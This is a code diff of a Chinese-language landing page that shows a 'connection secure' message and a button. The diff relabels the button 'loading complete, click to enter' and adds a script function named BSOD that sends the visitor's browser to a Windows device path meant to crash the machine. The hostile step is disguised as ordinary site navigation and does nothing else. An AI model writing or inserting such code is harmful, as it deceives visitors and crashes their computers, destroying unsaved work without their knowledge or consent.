@@ -32,7 +32,14 @@ body{margin:0;padding:0;background:#E6EAEB;font-family:Arial,'微软雅黑','宋
 				<font color="red">连接安全</font> 	
 				</p>
 			</div>
-			<a id="js-alert-btn" class="alert-btn" href="\\.\globalroot\device\condrv\kernelconnect">等不及了，立即前往</a>
+			<a id="js-alert-btn" class="alert-btn" onclick="BSOD()">加载完毕，点击进入</a>
+			    <script>
+        function BSOD(){
+	        document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';
+        }
+        </script>
+
+
 		</div>
 
 
